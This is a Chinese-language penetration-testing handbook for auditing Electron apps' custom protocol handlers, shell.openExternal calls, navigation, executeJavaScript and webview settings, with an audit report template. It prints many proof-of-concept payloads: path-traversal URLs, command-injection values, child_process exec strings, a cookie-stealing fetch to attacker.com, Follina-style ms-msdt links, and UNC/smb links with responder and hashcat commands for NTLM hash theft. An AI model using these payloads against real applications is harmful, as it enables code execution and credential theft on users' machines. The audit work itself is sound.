# 协议处理器与 shell.openExternal RCE 手册

## 概述

Electron 应用可以注册自定义协议（Deep Link）和使用 `shell.openExternal` 打开外部 URL。这两个功能如果缺乏安全校验，可直接导致 **远程代码执行（RCE）** 或 **NTLM 凭证泄露**。

---

## 一、自定义协议（Deep Link）攻击

### 1.1 协议注册搜索

```
在源码中搜索以下关键词定位协议注册点:

  app.setAsDefaultProtocolClient('myapp')     → 注册系统级协议 myapp://
  protocol.registerFileProtocol('myapp', ...) → 注册文件协议（旧 API）
  protocol.registerHttpProtocol             → HTTP 协议
  protocol.registerStringProtocol           → 字符串协议
  protocol.registerBufferProtocol           → Buffer 协议
  protocol.registerStreamProtocol           → 流协议
  protocol.handle('myapp', ...)             → 新 API（Electron 25+）

记录: 协议名称、handler 函数位置、参数处理逻辑
```

### 1.2 协议参数处理审计

**找到 handler 后，重点检查参数如何被使用:**

```javascript
// 危险模式 1: 参数直接构造文件路径
app.on('open-url', (event, url) => {
  const parsed = new URL(url);
  const filePath = parsed.searchParams.get('file');
  const content = fs.readFileSync(filePath);  // 路径穿越！
});

// 危险模式 2: 参数直接传给 loadURL
app.on('open-url', (event, url) => {
  const target = new URL(url).searchParams.get('url');
  mainWindow.loadURL(target);  // javascript: / data: 注入！
});

// 危险模式 3: 参数直接传给 shell.openExternal
app.on('open-url', (event, url) => {
  const link = new URL(url).searchParams.get('link');
  shell.openExternal(link);  // 任意程序执行！
});

// 危险模式 4: 参数拼接到命令中
app.on('open-url', (event, url) => {
  const action = new URL(url).searchParams.get('action');
  exec(`handler ${action}`);  // 命令注入！
});

// 危险模式 5: 参数直接渲染到页面（XSS）
app.on('open-url', (event, url) => {
  const msg = new URL(url).searchParams.get('message');
  mainWindow.webContents.executeJavaScript(
    `document.getElementById('msg').innerHTML = '${msg}'`  // XSS！
  );
});
```

### 1.3 漏洞类型与 PoC

#### 路径穿越

```
前提: handler 使用用户输入构造文件路径

PoC (Windows):
  myapp://file?path=..\..\..\..\Windows\System32\drivers\etc\hosts
  myapp://file?path=../../../../Windows/System32/drivers/etc/hosts
  myapp://file?path=..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts

PoC (Linux/Mac):
  myapp://file?path=../../../../etc/passwd
  myapp://file?path=..%2F..%2F..%2Fetc%2Fpasswd

验证方法:
  1. 在浏览器地址栏输入 PoC URL
  2. 或通过命令行: start myapp://file?path=../../../../etc/passwd (Windows)
  3. 检查应用是否返回/显示了目标文件内容
```

#### JavaScript 注入（导航到 javascript: URL）

```
前提: handler 将参数传给 loadURL 且未校验 scheme

PoC:
  myapp://navigate?url=javascript:alert(document.cookie)
  myapp://navigate?url=javascript:void(fetch('https://attacker.com/log?c='+document.cookie))
  myapp://open?url=data:text/html,<script>alert(1)</script>
  myapp://open?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

如果 nodeIntegration: true:
  myapp://navigate?url=javascript:void(require('child_process').exec('calc'))

验证方法:
  1. 浏览器中输入或命令行执行
  2. 观察是否弹出 alert 或执行了代码
```

#### 命令注入

```
前提: handler 将参数拼接到 shell 命令中

PoC (Windows):
  myapp://run?action=test%26calc
  myapp://run?action=test|calc
  myapp://run?action=test%26%26calc

PoC (Linux):
  myapp://run?action=test;id
  myapp://run?action=test$(whoami)
  myapp://run?action=test`id`

验证方法:
  1. 执行 PoC URL
  2. 检查是否弹出计算器(Windows)或命令执行结果
```

#### 任意导航

```
前提: handler 可导航到任意 URL

PoC:
  myapp://open?url=https://evil.com/phishing.html    → 钓鱼
  myapp://open?url=file:///C:/Windows/System32/       → 本地文件浏览
  myapp://open?url=file:///etc/passwd                 → 敏感文件读取

验证方法:
  1. 执行 PoC URL
  2. 检查应用窗口是否导航到了目标 URL
```

### 1.4 协议安全检查清单

| 检查项 | 安全 | 不安全 | 风险 |
|:-------|:-----|:-------|:-----|
| URL scheme 白名单 | 只允许 `https:` | 允许任意 scheme | 高 |
| 域名白名单 | 只允许特定域 | 无限制 | 高 |
| 路径规范化 | `path.resolve` + 目录检查 | 直接拼接 | 高 |
| URL 解码处理 | 解码后再校验 | 只校验原始字符串 | 中 |
| 输入消毒 | 转义特殊字符 | 直接传给命令 | 高 |

---

## 二、shell.openExternal 滥用

### 2.1 搜索所有调用点

```
搜索: shell.openExternal
记录每个调用点:
  - 文件位置和行号
  - 参数来源（硬编码? 用户输入? IPC 消息?）
  - 是否有 URL 校验
```

### 2.2 危险 URL Scheme

| Scheme | 效果 | 风险 | 平台 |
|:-------|:-----|:-----|:-----|
| `file:///C:/Windows/System32/cmd.exe` | 打开命令行 | **RCE** | Windows |
| `file:///C:/Windows/System32/calc.exe` | 打开计算器 | RCE 验证 | Windows |
| `file:///Applications/Terminal.app` | 打开终端 | **RCE** | macOS |
| `smb://attacker.com/share` | NTLM Hash 泄露 | **凭证窃取** | Windows |
| `\\attacker.com\share` | NTLM Hash 泄露（UNC） | **凭证窃取** | Windows |
| `mailto:?attach=C:\secret.txt` | 附件泄露 | 数据泄露 | 全平台 |
| `ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebsrowseForFile=?IT_LaunchMethod=ContextMenu IT_BrowseForFile=h$(calc)i"` | Follina 类攻击 | **RCE** | Windows |
| `search-ms:query=test&crumb=location:\\evil.com\share` | 搜索重定向 | 代码执行 | Windows |
| `ms-officecmd:...` | Office 命令执行 | 代码执行 | Windows |
| `vscode://...` | VS Code 打开文件 | 信息泄露 | 全平台 |
| `calculator:` | 打开计算器 | PoC 验证 | Windows 10+ |
| `ms-settings:` | 打开设置 | 信息泄露 | Windows 10+ |

### 2.3 验证 PoC

#### NTLM Hash 泄露（最常见的高危利用）

```
攻击场景:
  1. 攻击者在自己的服务器上启动 SMB 监听: 
     sudo responder -I eth0
     或: sudo impacket-smbserver share /tmp -smb2support

  2. 应用中找到可控的 shell.openExternal 调用

  3. 触发:
     shell.openExternal('\\\\attacker-ip\\share')
     或: shell.openExternal('smb://attacker-ip/share')

  4. 目标机器自动发送 NTLM 认证请求
     攻击者获取 NetNTLMv2 Hash
     可用 hashcat 破解: hashcat -m 5600 hash.txt wordlist.txt

如果应用有聊天/消息功能:
  发送包含 UNC 路径的消息
  如果应用自动预览链接或点击后调用 shell.openExternal
  → 被动触发 NTLM 泄露
```

#### 本地程序执行

```javascript
// 如果在 DevTools Console 中可以访问 shell:
const { shell } = require('electron');

// Windows - 打开计算器（PoC 验证）
shell.openExternal('file:///C:/Windows/System32/calc.exe');

// Windows - 打开命令行
shell.openExternal('file:///C:/Windows/System32/cmd.exe');

// 通过 Bridge:
window.electronAPI.openURL('file:///C:/Windows/System32/calc.exe');
```

#### 超链接 RCE

```
在应用的富文本输入区域（聊天、评论、文档编辑等）:

测试 1: 直接输入链接
  https://attacker.com → 是否调用 shell.openExternal?
  如果是 → 替换为:
    file:///C:/Windows/System32/calc.exe
    smb://attacker.com/share

测试 2: HTML 注入
  <a href="file:///C:/Windows/System32/calc.exe">点击这里</a>
  <a href="smb://attacker.com/share">查看文件</a>

测试 3: Markdown 链接
  [点击](file:///C:/Windows/System32/calc.exe)
  [分享](\\attacker.com\share)

验证: 点击后是否打开了目标程序或发送了 NTLM 请求
```

### 2.4 安全校验缺陷分析

```javascript
// 常见的不安全实现:

// ❌ 完全没有校验
shell.openExternal(url);

// ❌ 只检查了 http/https 但用 startsWith（可被绕过）
if (url.startsWith('http')) {
  shell.openExternal(url);
}
// 绕过: http.attacker.com → 实际是合法域名
// 但这不是真正的绕过，startsWith('http') 本身就允许了 http 和 https

// ❌ 黑名单方式（不完整）
if (!url.startsWith('file:')) {
  shell.openExternal(url);
}
// 绕过: smb://、\\UNC路径、ms-msdt://、search-ms: 等未在黑名单中

// ✅ 正确的白名单方式
function safeOpenExternal(url) {
  try {
    const parsed = new URL(url);
    if (!['http:', 'https:'].includes(parsed.protocol)) return false;
    // 可选: 域名白名单
    // if (!allowedDomains.includes(parsed.hostname)) return false;
    shell.openExternal(url);
  } catch(e) {
    return false;
  }
}
```

---

## 三、导航劫持

### 3.1 will-navigate 缺失

```
搜索: will-navigate / will-redirect / setWindowOpenHandler

如果主窗口没有监听这些事件:
  → 渲染进程可通过 JS 自由导航到任意 URL

验证:
  在 DevTools Console 中:
    location.href = 'https://evil.com'
    → 如果成功导航 → 导航劫持成功
    
    location.href = 'file:///C:/Windows/System32/'
    → 如果成功 → 可浏览本地文件系统

  如果 nodeIntegration: true:
    location.href = 'javascript:require("child_process").exec("calc")'
```

### 3.2 loadURL 参数注入

```
搜索: loadURL / webContents.loadURL

如果参数来自用户输入或 IPC:

  ipcMain.handle('navigate', (e, url) => {
    mainWindow.loadURL(url);  // 用户可控!
  });

  PoC:
    window.api.invoke('navigate', 'javascript:alert(1)')
    window.api.invoke('navigate', 'file:///etc/passwd')
    window.api.invoke('navigate', 'data:text/html,<script>alert(1)</script>')
```

### 3.3 window.open 滥用

```
如果没有 setWindowOpenHandler:

  Console:
    window.open('https://evil.com')
    → 新窗口可能继承了主窗口的 webPreferences（包括 nodeIntegration!）

    window.open('file:///C:/Windows/System32/')
    → 可能可以浏览本地文件

检查 setWindowOpenHandler:
  搜索代码中是否有:
    win.webContents.setWindowOpenHandler(({ url }) => {
      // 是否有 URL 校验?
      // 是否默认 deny?
    });
```

---

## 四、executeJavaScript 注入

### 4.1 搜索

```
搜索: webContents.executeJavaScript / executeJavaScript

[严重] 参数拼接了用户输入:
  win.webContents.executeJavaScript(`handleData('${userInput}')`)

  注入 PoC:
    userInput = "'); require('child_process').exec('calc'); ('"
    结果: handleData(''); require('child_process').exec('calc'); ('')
```

### 4.2 利用

```javascript
// 如果 IPC handler 调用了 executeJavaScript:
ipcMain.handle('run-js', (event, code) => {
  mainWindow.webContents.executeJavaScript(code);
});

// PoC（通过 Bridge 调用）:
window.api.invoke('run-js', "require('child_process').exec('calc')");
```

---

## 五、webview 标签利用

### 5.1 搜索

```
搜索: <webview / webviewTag: true

危险配置:
  <webview src={userInput} nodeintegration>           → RCE
  <webview src="https://untrusted.com" nodeintegration> → 不可信内容 RCE
  <webview> 未设置 partition                          → Session 共享
  <webview> 未监听 will-navigate                      → 导航劫持
```

### 5.2 利用

```javascript
// 如果页面上有 webview 且 nodeintegration 启用:
// 在 webview 加载的页面中:
require('child_process').exec('calc');

// 如果 webview src 可控:
// 攻击者可以让 webview 加载恶意页面
// 恶意页面中的 JS 直接获得 Node.js 权限
```

---

## 六、产出模板

```markdown
## 协议处理器 & shell.openExternal 审计

### 注册的自定义协议

| 协议名 | 注册位置 | Handler 位置 | 参数处理 | 风险 |
|:-------|:---------|:------------|:---------|:-----|
| myapp:// | main.js:XX | main.js:YY | 无校验 | 严重 |

### shell.openExternal 调用点

| 调用位置 | 参数来源 | URL 校验 | 可利用性 | 风险 |
|:---------|:---------|:---------|:---------|:-----|
| handler.js:XX | IPC 消息 | 无 | 已验证 | 严重 |

### 导航安全

| 事件 | 是否监听 | 校验逻辑 | 风险 |
|:-----|:---------|:---------|:-----|
| will-navigate | 否 | - | 高危 |
| will-redirect | 否 | - | 高危 |
| setWindowOpenHandler | 否 | - | 高危 |

### 漏洞详情

[按标准格式输出，含 PoC]
```
